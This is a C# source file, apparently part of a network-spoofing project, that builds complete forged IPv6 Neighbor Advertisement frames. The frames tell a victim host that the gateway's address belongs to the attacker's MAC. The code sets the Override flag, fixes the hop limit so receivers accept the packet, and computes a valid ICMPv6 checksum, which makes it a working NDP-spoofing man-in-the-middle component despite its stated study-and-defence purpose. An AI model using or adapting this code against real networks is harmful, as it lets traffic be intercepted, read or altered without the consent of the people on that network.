using PacketDotNet;
using SharpPcap;
using System.Net;
using System.Net.NetworkInformation;

/// <summary>
/// Builds IPv6 Neighbor Discovery Protocol (NDP) <i>Neighbor Advertisement</i>
/// frames - the IPv6 counterpart to a gratuitous ARP reply.
///
/// The advertisement tells the victim that <c>pSpoofedIp</c> (typically the
/// gateway) is reachable via this machine's MAC address, so the victim starts
/// sending the matching traffic to us. This is the exact mirror of the ARP
/// path in <see cref="Arp_Class"/> and exists for studying / defending against
/// NDP spoofing (see the project README).
/// </summary>
class Ndp_Class
{
    private readonly ILiveDevice liveDevice;

    // Neighbor Advertisement flags (RFC 4861 §4.4): Solicited (0x40) + Override
    // (0x20). Override tells the receiver to replace any cached entry.
    private const byte NaFlags = 0x60;

    // IANA protocol number for ICMPv6, used in the IPv6 pseudo-header checksum.
    private const byte IcmpV6ProtocolNumber = 58;

    private const byte NeighborAdvertisementType = 136;

    // Target link-layer address option (RFC 4861 §4.6.1): type 2, length 1 (in
    // units of 8 bytes).
    private const byte TargetLinkLayerAddressOption = 0x02;
    private const byte OptionLengthInEightByteUnits = 0x01;

    public Ndp_Class(ILiveDevice pLiveDevice)
    {
        liveDevice = pLiveDevice;
    }

    /// <summary>
    /// Builds a complete Ethernet frame carrying an ICMPv6 Neighbor
    /// Advertisement for <paramref name="pSpoofedIp"/>, addressed to the victim.
    /// </summary>
    /// <param name="pVictimIp">Destination IPv6 address (the victim).</param>
    /// <param name="pSpoofedIp">The IPv6 address we claim to own (the gateway).</param>
    /// <param name="pVictimMac">The victim's hardware address.</param>
    /// <returns>Ready-to-send wire bytes of the Ethernet frame.</returns>
    public byte[] BuildNeighborAdvertisement(IPAddress pVictimIp, IPAddress pSpoofedIp, PhysicalAddress pVictimMac)
    {
        PhysicalAddress ourMac = liveDevice.MacAddress;

        // --- ICMPv6 Neighbor Advertisement message (32 bytes) ---
        // [0..4)  type, code, checksum
        // [4..8)  flags + reserved
        // [8..24) target address (the address being advertised)
        // [24..32) target link-layer address option (type, length, MAC)
        byte[] icmp = new byte[32];
        icmp[0] = NeighborAdvertisementType;
        icmp[1] = 0; // code
        // icmp[2..4] checksum - left zero, computed below.
        icmp[4] = NaFlags;
        Buffer.BlockCopy(pSpoofedIp.GetAddressBytes(), 0, icmp, 8, 16);
        icmp[24] = TargetLinkLayerAddressOption;
        icmp[25] = OptionLengthInEightByteUnits;
        Buffer.BlockCopy(ourMac.GetAddressBytes(), 0, icmp, 26, 6);

        ushort checksum = ComputeIcmpV6Checksum(pSpoofedIp, pVictimIp, icmp);
        icmp[2] = (byte)(checksum >> 8);
        icmp[3] = (byte)(checksum & 0xFF);

        // --- IPv6 header ---
        // NDP packets MUST use a hop limit of 255; receivers drop anything else
        // (RFC 4861 §11.2), which is why the original implementation never
        // reached the neighbor cache.
        IPv6Packet ipv6 = new(pSpoofedIp, pVictimIp)
        {
            HopLimit = 255,
            NextHeader = ProtocolType.IcmpV6,
            PayloadLength = (ushort)icmp.Length
        };

        // --- Ethernet header ---
        EthernetPacket ethernet = new(ourMac, pVictimMac, EthernetType.IPv6);

        // Assemble the frame. With no PayloadPacket attached, Bytes holds only
        // the respective header (14 bytes for Ethernet, 40 for IPv6).
        byte[] ethernetHeader = ethernet.Bytes;
        byte[] ipv6Header = ipv6.Bytes;

        byte[] frame = new byte[14 + 40 + icmp.Length];
        Buffer.BlockCopy(ethernetHeader, 0, frame, 0, 14);
        Buffer.BlockCopy(ipv6Header, 0, frame, 14, 40);
        Buffer.BlockCopy(icmp, 0, frame, 54, icmp.Length);
        return frame;
    }

    /// <summary>
    /// Computes the ICMPv6 checksum, which - unlike ICMPv4 - is calculated over
    /// an IPv6 pseudo-header (source, destination, upper-layer length and the
    /// next-header value) followed by the ICMPv6 message itself (RFC 4443 §2.3).
    /// </summary>
    private static ushort ComputeIcmpV6Checksum(IPAddress pSourceIp, IPAddress pDestinationIp, byte[] pIcmpMessage)
    {
        byte[] source = pSourceIp.GetAddressBytes();
        byte[] destination = pDestinationIp.GetAddressBytes();
        int length = pIcmpMessage.Length;

        byte[] pseudo = new byte[40 + length + (length % 2)];
        int pos = 0;
        Buffer.BlockCopy(source, 0, pseudo, pos, 16); pos += 16;
        Buffer.BlockCopy(destination, 0, pseudo, pos, 16); pos += 16;
        pseudo[pos++] = (byte)(length >> 24);
        pseudo[pos++] = (byte)(length >> 16);
        pseudo[pos++] = (byte)(length >> 8);
        pseudo[pos++] = (byte)length;
        pseudo[pos++] = 0;
        pseudo[pos++] = 0;
        pseudo[pos++] = 0;
        pseudo[pos++] = IcmpV6ProtocolNumber;
        Buffer.BlockCopy(pIcmpMessage, 0, pseudo, pos, length);

        uint sum = 0;
        for (int i = 0; i < pseudo.Length; i += 2)
        {
            sum += (uint)((pseudo[i] << 8) | pseudo[i + 1]);
        }
        while ((sum >> 16) != 0)
        {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
        return (ushort)~sum;
    }
}
